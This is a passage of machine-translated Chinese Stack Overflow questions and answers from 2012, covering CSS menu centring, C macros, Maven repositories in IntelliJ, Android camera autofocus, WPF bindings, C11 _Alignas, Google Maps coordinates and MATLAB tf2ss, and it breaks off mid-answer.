<link rel="stylesheet" href="stylesheet.css" type="text/css" charset="utf-8">
<style type="text/css">
#head {
    background-image:url(http://manage.smarturl.it/_static/images/homeslice.png);
    background-repeat:repeat-x;
    text-align:center;
    color:#FFF;
    font:'BebasNeueRegular';
    border:none;
}
#head {
    padding:0px;
    margin:0px;
}
.style1 {
    font: 27px 'BebasNeueRegular', Arial, sans-serif;
    color:#FFF;
    list-style:none;
    margin-top:-20px;
}
.style1 li {
    float:left;
}
.style1 a {
    text-decoration:none;
    color:inherit;
    display:block;
    width:80px;
}

</style>
</head>

<body>
<div id="head">
<img src="logo8bit.png" width="491" height="188" /><br />
<ul class="style1"><li><a href="">LOGIN</a></li><li><a href="">SIGNUP</a></li><li><a href="">OTHER</a></li><li><a href="">MENU</a></li><li><a href="">STUFF</a></li></ul>
</div>
<br />
</body>
</html> 
```

我无法让菜单与边距居中对齐，因为每当我尝试这样做时，它都会弄乱菜单的显示方式，并且不会显示出来。请给我您的任何建议。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:14:06.167

如果您可以为`<ul>`元素设置显式宽度，则设置`margin:0 auto;`会将其居中。

如果您不知道 的宽度`<ul>`，请将浮动设置为，`display:inline-block`而不是`float:left;`然后，对于父级`<ul>`，`text-align:center;`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:15:17.997

你可以像这样使用css。

```
.style1{ margin-left:20px;}
.style1 li{ list-style:none; float :left;  padding:5px:} 
```

您可以增加 .style1 的 margin-left 并删除所有负值，因为它不是 Gud 的做法，而且我认为您不需要手动为 li 内的锚标签指定宽度。

# c++ - 宏扩展中的语法错误

> ID：10676793
> 
> 赞同：0
> 
> 时间：2012-05-20T20:07:56.590
> 
> 标签：c++, c, macros

如果定义了 unicode，则 TEXT("x") 宏如何扩展为 L"x"，如果未定义 unicode，则扩展为 "x"，因为当我尝试编译以下代码时，它会显示“错误 #1049：宏参数中的语法错误。”

```
#define T("x") "x"

int main()
{
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:14:09.687

在您的安装中查找`tchar.h`标题。你会得到类似下面的东西：

```
#define __T(x)      L ## x 
```

在 Unicode 模式下，上述宏将一个`L`和一个字符串参数粘贴在一起。在 ASCII 模式下，没有要粘贴的前缀，所以它很简单：

```
#define __T(x)      x 
```

请注意，您通过另一个宏`_T()`（带有单个下划线）间接调用此宏，并将字符串文字作为参数传递。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:10:29.213

```
#define T("x") "x" 
```

这定义了一个宏函数，如果没有任何引号，那么`T`命名的参数是什么。`x`你可以尝试这样的事情：

```
#define T(x) #x 
```

# maven - 在 IntelliJ 中添加 maven 存储库

> ID：10676796
> 
> 赞同：23
> 
> 时间：2012-05-20T20:08:04.620
> 
> 标签：maven, intellij-idea

我在“设置”>“Maven”>“存储库”下添加此存储库[http://repo1.maven.org/maven2/时遇到问题。](http://repo1.maven.org/maven2/)它还显示 Nexus Service 或 Artifactory URL。如何检查 URL 是否是这些类型之一？

[http://repo1.maven.org/maven2/](http://repo1.maven.org/maven2/)是我在 NetBeans for Maven 中使用的 URL，它在那里工作。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-20T20:24:44.027

此存储库已默认使用并且是硬编码的，您无需手动添加。如果您想使用任何其他存储库，最简单的方法是[直接在`pom.xml`](http://maven.apache.org/pom.html#Repositories)文件或[settings.xml](http://maven.apache.org/guides/mini/guide-mirror-settings.html)中定义它。无论哪种方式，IDEA 都会自动加载这些设置。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-12-28T08:02:03.367

在 Windows 上，将 repo 添加为该文件的镜像`C:\Users\{user}\.m2\settings.xml`

```
<settings>
  ...
  <mirrors>
    <mirror>
      <id>other-mirror</id>
      <name>Other Mirror Repository</name>
      <url>https://repo1.maven.org/maven2</url>
      <mirrorOf>central</mirrorOf>
    </mirror>
  </mirrors>
  ...
</settings> 
```

或者

将`<repositories>`标签添加到`<project>`

```
 <repositories>
    <repository>
      <releases>
        <enabled>false</enabled>
        <updatePolicy>always</updatePolicy>
        <checksumPolicy>warn</checksumPolicy>
      </releases>
      <snapshots>
        <enabled>true</enabled>
        <updatePolicy>never</updatePolicy>
        <checksumPolicy>fail</checksumPolicy>
      </snapshots>
      <name>Nexus Snapshots</name>
      <id>snapshots-repo</id>
      <url>https://repo1.maven.org/maven2</url>
      <layout>default</layout>
    </repository>
  </repositories> 
```

# android - android：onAutoFocus() 未在 android 4.0（冰淇淋三明治）虚拟设备上触发

> ID：10676801
> 
> 赞同：4
> 
> 时间：2012-05-20T20:09:21.077
> 
> 标签：android, android-camera

我每 3 秒自动聚焦一次，我的代码在我的硬件设备（Galaxy S）上运行，但在我的 AVD（虚拟设备）上，应该在聚焦完成后调用的回调永远不会被调用。有人知道为什么吗？

```
public void onPreviewStart(){
        Log.v(TAG,"onPreviewStart() focusTimer: "+focusTimer);
        if(this.autoFocus == true && getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_AUTOFOCUS)){
            focusTimer = new Runnable() {
                public void run() {
                    Log.d(TAG, "focus run..");
                    if(preview != null && preview.camera != null && !saving){
                        focusing = true;

                        Log.d(TAG, "focusing.."+preview);
                        //  ----> this gets called each 3 seconds
                        preview.camera.autoFocus(new Camera.AutoFocusCallback() {   

                            public void onAutoFocus(boolean success, Camera camera) {
                                // ----> this never gets called on ICS :(
                                Log.d(TAG, "onAutoFocus()");
                                focusing = false;
                                if(shootButtonWasPressed){  // if shooting was scheduled
                                    Log.d(TAG, "shootButtonWasPressed");
                                    shoot();
                                    shootButtonWasPressed = false;
                                }
                            }
                        });
                    }
                    preview.postDelayed(focusTimer, 3000);
                }
            };
            Log.v(TAG,"focusTimer run()");
            focusTimer.run();
        }else{
            focusTimer = null;
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-28T08:30:33.387

你的代码似乎是正确的。问题是，在您的 AVD 上，您的相机是您的网络摄像头或类似的东西。这个网络摄像头有一个静态焦点，所以你的代码无法处理它......

如果您想对此进行测试，请尝试将您的手机升级到 4.0，如果您需要帮助，请看这里：http: [//forum.xda-developers.com/forumdisplay.php?f=656](http://forum.xda-developers.com/forumdisplay.php?f=656)

我希望你现在能看到问题！

最好的祝福

苹果浏览器

# licensing - 使用 Visual Studio 2011 Express beta 发布应用程序

> ID：10676802
> 
> 赞同：0
> 
> 时间：2012-05-20T20:09:23.533
> 
> 标签：licensing, visual-studio-express

我下载了 Visual Studio 2011 Express beta，它说它是用于调试、开发等，而不是用于部署/发布软件或应用程序。

我是否被排除在发布我用它开发的任何东西之外？我可以稍后将代码复制到另一个（未发布？）版本吗？

我应该考虑购买另一个（比如付费的非快速测试版？）版本吗？

我用谷歌搜索了它，但没有看到任何简单的答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T20:12:03.097

2005、2008 和 2010 的已发布 Visual Studio 版本的速成版允许您部署和发布使用它们创建的软件*。*

我不希望*测试版*拥有这样的权限，因为它*是*测试版，并且可能包含将在产品进入 RTM 时修复的错误和问题。您想在生产系统中抓住这个机会吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:12:18.950

Visual Studio 11 尚未发布。这就是为什么您只能获得测试版的原因。如果您正在开发 .NET 4.5 应用程序，那么它也处于测试阶段。同上 Windows 8，如果它是 Metro 应用程序。

如果您只使用 .NET 4（或更早版本），您可以获得 Visual Studio 2010（[付费](http://www.microsoft.com/visualstudio/en-gb/products)版或[Express](http://www.microsoft.com/visualstudio/en-us/products/2010-editions/express)版）。否则，请等到您正在开发的平台也发布...

# c# - 属性值反映他人的

> ID：10676805
> 
> 赞同：0
> 
> 时间：2012-05-20T20:10:05.687
> 
> 标签：c#, wpf, visual-studio-2010

我正在创建一个贷款计算器，并且我有 3 个文本框，我试图让它们相互反映。在我更改其中一个 TextBox 的输入后，我希望通过按下程序上的计算按钮或在 TextBox 失去焦点后，根据输入重新计算另一个 2。

我拥有的三个文本框绑定到在运行程序时设置的某些值以及在运行时更改的能力：

```
 <TextBox Width="55" Height="23" Style="{StaticResource ResourceKey=StandardTextbox}" Text="{Binding StringFormat={}{0:P}, Path=CurrentLoan.PropertyTaxRate, Converter={StaticResource TextBoxToDecimalConverter1}}"/>

     <TextBox Width="65" Height="23" Style="{StaticResource ResourceKey=StandardTextbox}" Text="{Binding StringFormat={}{0:C}, Path=CurrentLoan.PropertyTaxMonth, Converter={StaticResource TextBoxToDecimalConverter1}}"/>

     <TextBox Width="65" Height="23" Style="{StaticResource ResourceKey=StandardTextbox}" Text="{Binding StringFormat={}{0:C}, Path=CurrentLoan.PropertyTaxYear, Converter={StaticResource TextBoxToDecimalConverter1}}"/>

     CurrentLoan.PropertyTaxRate = .012;
     CurrentLoan.PropertyTaxMonth = 250;
     CurrentLoan.PropertyTaxYear = 3000;

     SharedValues.HomeValue = 250000; 
```

对于价值 250,000 美元且税率为 1.2% 的房屋，年付款额为 3000 美元（250,000 * .012），每月付款额为 250 美元（3,000 / 一年 12 个月）。

此外，我已经像这样声明了属性：

```
 public double PropertyTaxRate
  {
     get { return _propertyTaxRate; }
     set { SetValueAndNotify(() => PropertyTaxRate, ref _propertyTaxRate, (value > 1) ? value / 100 : value); }
  }

  public double PropertyTaxMonth
  {
     get { return _propertyTaxMonth; }
     set { SetValueAndNotify(() => PropertyTaxMonth, ref _propertyTaxMonth, value); }
  }

  public double PropertyTaxYear
  {
     get{ return _propertyTaxYear; }
     set { SetValueAndNotify(() => PropertyTaxYear, ref _propertyTaxYear, value); }
  } 
```

SetValueAndNotify 方法只是将值设置为支持属性，并使用 INotifyPropertyChanged 通知 GUI 该属性已更改。

假设我将 PropertyTaxYear 属性更改为 $6,000，我希望 PropertyTaxMonth 更改为 $500，PropertyTaxRate 更改为 2.4%。任何人都知道如何做到这一点并使属性相互反映？预先感谢您的意见！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:34:58.663

试试这个，小心避免无休止的递归。它有助于检查`if (value != <old value>)`。还要`SetValueAndNotify`在设置其他相关属性之前调用，以使此检查生效。

```
public double PropertyTaxRate
{
    get { return _propertyTaxRate; }
    set { 
        if (value > 1) {
            value /= 100;
        }
        if (value != _propertyTaxRate) {
            SetValueAndNotify(() => PropertyTaxRate, ref _propertyTaxRate, value); 
            PropertyTaxYear = value * SharedValues.HomeValue;
        }
    }
}

public double PropertyTaxMonth
{
    get { return _propertyTaxMonth; }
    set {
        if (value != _propertyTaxMonth) {
            SetValueAndNotify(() => PropertyTaxMonth, ref _propertyTaxMonth, value); 
            PropertyTaxYear = 12 * value;
        }
    }
}

public double PropertyTaxYear
{
    get{ return _propertyTaxYear; }
    set { 
        if (value != _propertyTaxYear) {
            SetValueAndNotify(() => PropertyTaxYear, ref _propertyTaxYear, value);
            PropertyTaxMonth = value / 12;
            PropertyTaxRate = value / SharedValues.HomeValue;
        }
    }
} 
```

* * *

**更新**

递归问题比预期的要难。由于`SetValueAndNotify`可能会触发意外行为，我建议对支持变量进行所有计算并在完成时通知。（我没有展示仍然创建`OnNotifyPropertyChanged`方法的代码。）

```
private void Notify()
{
    OnNotifyPropertyChanged(() => PropertyTaxRate);
    OnNotifyPropertyChanged(() => PropertyTaxYear);
    OnNotifyPropertyChanged(() => PropertyTaxMonth);
}

public double PropertyTaxRate
{
    get { return _propertyTaxRate; }
    set { 
        if (value > 1) {
            value /= 100;
        }
        if (value != _propertyTaxRate) {
            _propertyTaxRate = value;
            _propertyTaxYear = value * SharedValues.HomeValue;
            _propertyTaxMonth = _propertyTaxYear / 12;
            Notify();
        }
    }
}

public double PropertyTaxMonth
{
    get { return _propertyTaxMonth; }
    set {
        if (value != _propertyTaxMonth) {
            _propertyTaxMonth = value;
            _propertyTaxYear = 12 * value;
            _propertyTaxRate =  _propertyTaxYear / SharedValues.HomeValue;
            Notify();
        }
    }
}

public double PropertyTaxYear
{
    get{ return _propertyTaxYear; }
    set { 
        if (value != _propertyTaxYear) {
            _propertyTaxYear = value;
            _propertyTaxMonth = value / 12;
            _propertyTaxRate = value / SharedValues.HomeValue;
            Notify();
        }
    }
} 
```

# php - 是否有用于创建控制器和视图文件的命令行“命令”？

> ID：10676807
> 
> 赞同：0
> 
> 时间：2012-05-20T20:10:13.580
> 
> 标签：php, symfony

我想知道是否有一个命令可以在我的终端上运行，它会根据我的输入创建控制器并查看目录和文件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T20:13:38.343

看看这个：[Generating a CRUD Controller Based on a Doctrine Entity](http://symfony.com/doc/current/bundles/SensioGeneratorBundle/commands/generate_doctrine_crud.html)。

# html - 单击链接时替换 div 的内容

> ID：10676809
> 
> 赞同：-2
> 
> 时间：2012-05-20T20:10:23.597
> 
> 标签：html

好吧，我会在 html 页面中重现这种情况。我在 html 页面中有一个 div，在这个 div 中我有两个链接。当我点击其中一个链接时，div 会发生变化，但不会更改整个网页。我怎么能意识到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:30:59.407

使用jQuery：

```
<div id="changeMe">
 <p id="changeThis">You have some stuff here</p>
 <a href="#" id="changeLink">Click to change</a>
</div>

<script>
$('#changeLink').click(function(){
  $('#changeThis').html('I am the new text');
  return false;
});
</script> 
```

看到它在这里运行[http://jsfiddle.net/G9MgN/](http://jsfiddle.net/G9MgN/)

> 请记住，要使用此方法，您需要在您的

```
> <head></head> 
```

你可以使用谷歌的服务来做到这一点

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script> 
```

# xml - Scala XML 相等问题

> ID：10676812
> 
> 赞同：3
> 
> 时间：2012-05-20T20:10:41.247
> 
> 标签：xml, scala, equals

我想为 a 编写一个测试用例`case class`，它有一个`toXML`方法。

```
import java.net.URI

case class Person(
  label: String = "author",
  name: String,
  email: Option[String] = None,
  uri: Option[URI] = None) {

  // author must be either "author" or "contributor"
  assert(label == "author" ||
    label == "contributor")

  def toXML = {
    val res =
      <author>
        <name>{ name }</name>
        {
          email match {
            case Some(email) => <email>{ email }</email>
            case None => Null
          }
        }
        {
          uri match {
            case Some(uri) => <uri>{ uri }</uri>
            case None => Null
          }
        }
      </author>

    label match {
      case "author" => res
      case _ => res.copy(label = label) // rename element
    }
  }
} 
```

现在，我想断言，输出是正确的。为此我使用`scala.xml.Utility.trim`

```
import scala.xml.Utility.trim

val p1 = Person("author", "John Doe", Some("jd@example.com"),
  Some(new URI("http://example.com/john")))
val p2 =
  <author>
    <name>John Doe</name>
    <email>jd@example.com</name>
    <uri>http://example.com/john</uri>
  </author>

assert(trim(p1.toXML) == trim(p2)) 
```

但这会导致断言错误。如果我尝试通过比较字符串表示来断言相等

```
assert(trim(p1.toXML).toString == trim(p2).toString) 
```

没有断言错误。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:43:51.390

首先你的代码有问题：你有`uri: Option[URI]`（我假设是`java.net.URI`）作为构造函数参数，但是你用`Option[String]`.

这也是你问题的根源：

```
scala> val uri = "http://stackoverflow.com/q/10676812/334519"
uri: java.lang.String = http://stackoverflow.com/q/10676812/334519

scala> <u>{new java.net.URI(uri)}</u> == <u>{uri}</u>
res0: Boolean = false

scala> <u>{new java.net.URI(uri)}</u>.toString == <u>{uri}</u>.toString
res1: Boolean = true 
```

发生的事情是元素的子元素是一个[`Atom`](http://www.scala-lang.org/api/current/scala/xml/Atom.html)，它具有一个类型参数，用于`data`它携带的值。在您的`p1`this 中是 a `URI`（假设我们已经更正了测试以使其与构造函数匹配），并且在`p2`它中是`String`.

# java - 忽略java中的空格分隔符

> ID：10676813
> 
> 赞同：-2
> 
> 时间：2012-05-20T20:10:51.393
> 
> 标签：java, string, delimiter, space

我正在寻找一种将句子作为单个字符串输入的方法，我该怎么做？我也可以只使用一个文件作为输入（.txt），但我不知道如何处理它。

我基本上想忽略“空格”分隔符，需要帮助找出如何

到目前为止我所拥有的：

```
Scanner input = new Scanner(System.in);
    Random randomGenerator = new Random();
    int rand = randomGenerator.nextInt(10)+1;
    System.out.print("Enter code to be encoded. End the text with a semicolon(;): ");
    String in = input.next();
    System.out.println();
    System.out.println("Confirmation: Encode the following text? y to accept, n to decline");
    System.out.println(in); 
```

编辑：添加 src 我正在为我和一些朋友制作编码器，并且想一次做句子而不是一次做单词。是的，它们将以句号结束。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:50:24.753

如果要使用“;”，请将分隔符设置为“;” 作为分隔符：

```
input.useDelimiter (";") 
```

# iphone - 如何使用 iPhone 应用程序在 MVC4 apicontroller 中提供用户安全性

> ID：10676815
> 
> 赞同：4
> 
> 时间：2012-05-20T20:11:11.630
> 
> 标签：iphone, asp.net-mvc-4, restful-authentication

我使用 MVC4 web api 为 iphone 应用程序开发新的 restful 服务，但我是 restful 服务的新手，因此我不知道如何提供用户安全。

例如，知道发布 url 地址的人，将任何内容发布到我的表格中。那么我该如何预防呢？

此致。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-29T20:22:10.433

我终于在这个网站上找到了解决方案

[http://www.asp.net/web-api/overview/working-with-http/html-forms-and-multipart-mime](http://www.asp.net/web-api/overview/working-with-http/html-forms-and-multipart-mime)

我希望这对其他新手 mvc4 wep api 开发人员有所帮助。

# c# - Unity 的基于约定的注册扩展

> ID：10676819
> 
> 赞同：0
> 
> 时间：2012-05-20T20:11:31.170
> 
> 标签：c#, dependency-injection, inversion-of-control, unity-container

我试图弄清楚什么被认为是实现这一点的好方法。

```
public class UnityEx : UnityRegistry
{
    private static void RegisterTypes(IUnityContainer container)
    {

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:44:30.780

[查看codeplex](http://tecx.codeplex.com/wikipage?title=AdvancedConfigurationEngineForUnity)上的TecX 项目。它包含一个增强的 Unity 配置引擎。它最初是 StructureMap 配置的一个端口，并为 Unity 带来了对约定的支持。

# r - R：大矩阵乘法

> ID：10676822
> 
> 赞同：5
> 
> 时间：2012-05-20T20:11:55.297
> 
> 标签：r, matrix, r-bigmemory

全部，

我正在 64 位 Windows 7 上使用 R2.14。

我正在尝试对 big.matrix 对象进行平方（非常感谢开发人员），并且可能需要将其提高到更高的功率。

根据我的研究，bigalgebra 软件包就在我的街道上，但它似乎仍在建设中。

big.matrix 对象上的代数有什么替代方法吗？

提前致谢。W。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-02-07T21:06:29.467

试试这个**bigalgebra**：

```
install.packages("bigalgebra", repos="http://R-Forge.R-project.org") 
```

这必须工作！

# python - xlwt 工作表中的列数

> ID：10676824
> 
> 赞同：0
> 
> 时间：2012-05-19T17:10:06.127
> 
> 标签：python, excel, xlwt

我似乎找不到在 xlwt.Workbook() 中返回工作表中列数的值的方法。这个想法是在一个目录中获取一堆 .xls 文件并将它们组合成一个。我遇到的一个问题是在编写下一个文件时更改列位置。这就是我目前正在使用的：

```
import xlwt, xlrd, os

def cbc(rd_sheet, wt_sheet, rlo=0, rhi=None,
rshift=0, clo=0, chi=None, cshift = 0):
    if rhi is None: rhi = rd_sheet.nrows
    if chi is None: chi = 2#only first two cols needed
    for row_index in xrange(rlo, rhi):
        for col_index in xrange(clo, chi):
            cell = rd_sheet.cell(row_index, col_index)
            wt_sheet.write(row_index + rshift, col_index + cshift, cell.value)

Dir = '/home/gerg/Desktop/ex_files'
ext = '.xls'
list_xls = [file for file in os.listdir(Dir) if file.endswith(ext)]
files = [Dir + '/%s' % n for n in list_xls]
output = '/home/gerg/Desktop/ex_files/copy_test.xls'
wbook = xlwt.Workbook()
wsheet = wbook.add_sheet('Summary', cell_overwrite_ok=True)#overwrite just for the repeated testing

for XLS in files:
    rbook = xlrd.open_workbook(XLS)
    rsheet = rbook.sheet_by_index(0)
    cbc(rsheet, wsheet, cshift = 0)

wbook.save(output) 
```

list_xls 返回：

```
['file2.xls', 'file3.xls', 'file1.xls', 'copy_test.xls'] 
```

文件返回：

```
['/home/gerg/Desktop/ex_files/file2.xls', '/home/gerg/Desktop/ex_files/file3.xls', '/home/gerg/Desktop/ex_files/file1.xls', '/home/gerg/Desktop/ex_files/copy_test.xls'] 
```

我的问题是如何每次将写入 xlwt.workbook 的每个文件都搜索 2 倍。这段代码给了我第一个保存到`.../copy_test.xls`. 文件列表也有问题吗？我有一种感觉，可能有。这是 Python2.6，我在 windows 和 linux 之间跳来跳去。

谢谢你的帮助，GM

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T23:20:43.800

您只使用每个输入电子表格中的前两列。您不需要“xlwt.Workbook() 中工作表中的列数”。您的代码中已经有了该`cshift`机制，但您没有使用它。您需要做的就是更改外部块中的循环，如下所示：

```
for file_index, file_name in enumerate(files):
    rbook = xlrd.open_workbook(file_name)
    rsheet = rbook.sheet_by_index(0)
    cbc(rsheet, wsheet, chi = 2, cshift = file_index * 2) 
```

一般而言，将
`if chi is None: chi = 2`
函数中的行更改为并作为 arg
`if chi is None: chi = rsheet.ncols`
传入，就像我在上面的代码中所做的那样。`chi=2`

我不明白你覆盖覆盖检查的理由......肯定在你的应用程序中，覆盖现有的单元格值是不正确的？

你说“这段代码给了我第一个保存到 .../copy_test.xls 的文件”。首先输入顺序是file2.xls。您显示的代码正在覆盖先前的输入，并将为您提供最后一个文件（按输入顺序），而不是第一个......也许您弄错了。注意：最后一个输入文件“copy_test.xls”很可能是以前的输出文件；也许您的输出文件应该放在一个单独的文件夹中。

# c - 使用 _Alignas 进行结构成员对齐

> ID：10676827
> 
> 赞同：6
> 
> 时间：2012-05-20T20:12:15.140
> 
> 标签：c, standards, c11

我想知道以下问题：`_Alignas`C11 中的新对齐说明符是否适用于结构成员？

我一直假设这么多，但是对 N1570 公开草案的彻底阅读似乎表明*对齐说明符*不能出现在*说明符限定符列表*中，如果支持的话，这是我期望的位置. 我已经阅读了几次语法，但无法弄清楚`_Alignas`在结构成员声明中应该如何被允许。

但是，在我看来，该标准的意图是 `_Alignas`应该适用于结构成员，因为`_Alignas`（第 6.7.5 节）的段落指出“对齐属性不应在 [...] 的声明中指定位域”。鉴于术语“位域”在第 6.7.2.1 节中定义为结构成员（准确的措辞：“这样的成员称为*位域*”），我一直将这句话解释为隐含地表示对齐说明符是允许非位域成员。

检查现有实现表明，Clang 3.0 和 GCC 4.7 都支持`_Alignas`结构成员而不会抱怨（带有`-pedantic`）。Clang 源代码复制了与 N1570 相同的语法，但`Parser::ParseSpecifierQualifierList` 允许使用对齐说明符；不过，该函数确实包含一个 TODO 元素，内容如下：

```
/// TODO: diagnose attribute-specifiers and alignment-specifiers. 
```

GCC C 解析器代码看起来很相似，即即使它引用了标准语法，它也允许在说明符-限定符列表中使用对齐说明符。

我还检查了已知缺陷列表以及 comp.lang.c 和 comp.std.c，以查看是否在此处提出了该主题，但似乎并非如此。因此，我的问题是：结构成员是否应该允许使用对齐说明符？

编辑：相关的语法规则是：

```
// Compare this...
(6.7) declaration-specifiers:
           storage-class-specifier declaration-specifiers_opt
           type-specifier declaration-specifiers_opt
           type-qualifier declaration-specifiers_opt
           function-specifier declaration-specifiers_opt
           // This seems to be the only place that mentions
           // alignment-specifier on the rhs of a rule.
           alignment-specifier declaration-specifiers_opt

(6.7.2.1) struct-or-union-specifier:
           struct-or-union identifier_opt { struct-declaration-list }
           struct-or-union identifier

(6.7.2.1) struct-declaration-list:
           struct-declaration
           struct-declaration-list struct-declaration

(6.7.2.1) struct-declaration:
           specifier-qualifier-list struct-declarator-list_opt ;
           static_assert-declaration

// ...to this.
(6.7.2.1) specifier-qualifier-list:
           type-specifier specifier-qualifier-list_opt
           type-qualifier specifier-qualifier-list_opt
           // Missing alignment-specifier specifier-qualifier-list_opt?

(6.7.5) alignment-specifier:
          _Alignas ( type-name )
          _Alignas ( constant-expression ) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T20:45:00.307

第 6.7.5 节，第 6 页，明确指出这也涉及成员的对齐

> 声明的对象或成员的对齐要求被视为指定的对齐方式。

所以预期的语义就是那个。如果如您所说，语法的正式规范遗漏了那一点（我没有检查），这是一个缺陷，您应该报告它。

**编辑：**查看语法，在我看来，`alignment-specifier`在 6.7.2.1 的情况下缺少添加`specifier-qualifier-list`，并且第 14 段中的文字解释是有序的。

# javascript - 将位置坐标作为变量传递给谷歌地图

> ID：10676828
> 
> 赞同：9
> 
> 时间：2012-05-20T20:12:16.593
> 
> 标签：javascript, google-maps, google-maps-api-3

任何人都知道为什么这会起作用：

```
var wickedLocation =  new google.maps.LatLng(44.767778, -93.2775); 
```

但这不会：

```
var wickedCoords = "44.767778, -93.2775";
var wickedLocation =  new google.maps.LatLng(wickedCoords); 
```

我尝试将纬度和经度作为单独的变量传递，但这也没有奏效。如何成功地将坐标作为变量传递？谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-20T20:15:29.597

在此示例中，您将两个不同的数值传递给构造函数，然后将新创建的对象分配给 wickedLocation：

```
var wickedLocation =  new google.maps.LatLng(44.767778, -93.2775); 
```

在此示例中，您将单个字符串值传递给需要两个不同数字坐标的构造函数：

```
var wickedCoords = "44.767778, -93.2775";
var wickedLocation =  new google.maps.LatLng(wickedCoords); 
```

数据类型完全不同。

话虽如此，如果要将坐标表示为单个对象，则可以这样做：

```
var myHome = { "lat" : "44.767778" , "long" : "-93.2775" };

var yourHome = { "lat" : "23,454545" , "long" : "-92.12121" }; 
```

然后，当您需要从 Google 创建 coords 对象时，您可以将数据作为派生自单个对象的单独参数传递：

```
var wickedLocation =  new google.maps.LatLng( myHome.lat, myHome.long ); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-20T20:32:01.417

如果您以字符串形式获取坐标，按照您在示例中显示的格式，您可以这样做：

```
var b=wickedCoords.split(",");
var wickedLocation=new google.maps.LatLng(parseFloat(b[0]), parseFloat(b[1])); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-20T20:21:34.007

我相信您可以使用字符串来定义坐标，但您需要两个（每个参数一个）而不是一个。

```
wickedLat = '44.767778';
wickedLon = '-93.2775';
wickedLocation = new google.maps.LatLng(wickedLat, wickedLon); 
```

如果不直接使用浮点数或将字符串解析为浮点数`parseFloat()`

# function - 当 tf2ss() 返回空矩阵时我该怎么办？

> ID：10676853
> 
> 赞同：1
> 
> 时间：2012-05-20T20:15:47.360
> 
> 标签：function, matlab, matrix, transfer, state-space

我通过向其发送输入并从中获取输出来迭代单输入单输出线性系统。系统传递函数的分母和分母`Nom`分别`Den`用代码表示。

`Nom`并且`Den`是在对某些多项式进行一些复杂运算后计算出来的，所以我没有关于这些多项式程度的先验信息。我唯一知道的是系统是正确的（即，度数`Den`大于或等于度数`Nom`）。

我的代码是这样的：

```
% ...

Nom = (...);  % calculated after some complex operations
Den = (...);  % calculated after some complex operations

[A, B, C, D] = tf2ss(Nom, Den);
x = zeros(size(B));  % state vector
xp = x;              % derivative of the state vector

% ...

for t = 0 : SAMPLING_PERIOD : TIME_END
    % ...
    xp = A * x + B * u;    % 'u' is some scalar input, calculated in the code previously
    y  = C * x + D * u;    % 'y' is some irrelevant output signal, to be used in somewhere else in the code
    x  = xp * SAMPLING_PERIOD;
    % ...
end

% ... 
```

当`Den`是 0^阶（也需要`Nom`是 0^阶）时，返回 、`tf2ss()`和 的`A`空矩阵。这在我的其他代码部分有些问题。我需要这些矩阵至少是 1×1。`B``C``D`

所以，我的问题是，对于那些返回空的人，我可以使用哪些等效的非空矩阵来代替`A`,和？例如，我可以假设所有空矩阵都是 1×1 零矩阵吗？`B``C``D`

* * *

例子：

`[A, B, C, D] = tf2ss([1], [2])`
返回
`A = [] % Empty matrix`
`B = [] % Empty matrix`
`C = [] % Empty matrix`
`D = 0.5 % 1-by-1 matrix`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T21:06:35.073

Ultimelty，您需要了解输出提供的内容。

为tf2ss编写代码的方式，`if size(den) = 1`那么`a = b =c =[]`

原因是您不再提供微分方程，而是将微分方程分量与输出分开。

出于您的目的，知道它是单输入单输出系统，`A`并且`B`可以是随机矩阵，只要您有 x*C = [0]，您应该没问题。这个想法是没有真正的“等式状态”。但是，出于您的目的，您应该指示 Matlab 只有一个不受其导数影响的状态（即当前状态，对于纯增益系统来说是准确的），其中 A = B = C = 0

虽然 Matlab 在构建系统时可能会看到差异，但实际上它们是相同的：

```
[A, B, C, D] = tf2ss([1], [2]);
H2 = ss(0,0,0,D);
H1 = ss(A,B,C,D);
bode(H1/ H2) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:18:55.970

空矩阵绝对不是`1x1`零。如果您需要以某种方式标记结果不是数字，但大小仍为`1x1`，请尝试返回`NaN`。

# jquery - 访问链接后更改链接元素的样式？

> ID：10676855
> 
> 赞同：2
> 
> 时间：2012-05-20T20:15:55.447
> 
> 标签：jquery, css

我试图在访问后更改链接元素的样式。我尝试使用 css 和 jquery 完成此操作，但没有成功。

如果我删除下面的 ':visited'，它会按预期工作，并且所有元素都具有下面提到的样式。但是，当我尝试仅将样式应用于访问的元素时，没有应用任何样式，我似乎无法弄清楚原因：/

jsfiddle：http: [//jsfiddle.net/rN9gA/1/](http://jsfiddle.net/rN9gA/1/)

jQuery

```
$("#numresults a:visited div").css("border","3px solid #777777"); 
```

HTML

```
<div id="numresults">               
    <a class="results-per-page" href="search.php?option=1"><div>6</div></a>
    <a class="results-per-page" href="search.php?option=2"><div>12</div></a>
    <a class="results-per-page" href="search.php?option=3"><div>24</div></a>
</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
